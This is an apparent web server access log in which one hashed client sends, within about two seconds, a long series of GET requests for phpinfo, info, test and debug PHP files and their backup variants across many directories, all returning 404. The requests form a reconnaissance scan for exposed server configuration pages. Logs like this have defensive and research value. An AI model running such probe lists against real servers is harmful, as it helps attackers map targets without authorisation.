043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/scripts/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/www/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/www/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/site/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/site/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/test.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:47:59;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/admin/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/admin/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/admin/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/admin/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/dev/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/dev/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/dev/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/phpinfo.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info1.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/test/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/info.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:00;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php.tmp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/i.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info2.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php.swp;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpversion.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/server.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php_info.php.bak;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php_version.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/pi.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/serverinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/includes/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php_info.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php_info.php.orig;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/scripts/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/public/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/includes/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/public/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/public/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/scripts/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/web/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php_info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/diagnostic.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/debug.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/php_info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/info.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php.backup;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php.old;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/dev/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/check.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/scripts/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/includes/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/includes/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/web/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/tmp/phpinfo.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phpinfo.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/web/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/www/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/public/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/site/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/web/phpinfo.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/phptest.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/site/info.php;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/test.php~;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/www/info.php.save;GET;404
043321487949ed6c75b9acb53509f6e7947231662fb469ef7a41c8b678ccbb68;2025-11-16 22:48:01;;/site/phpinfo.php.save;GET;404
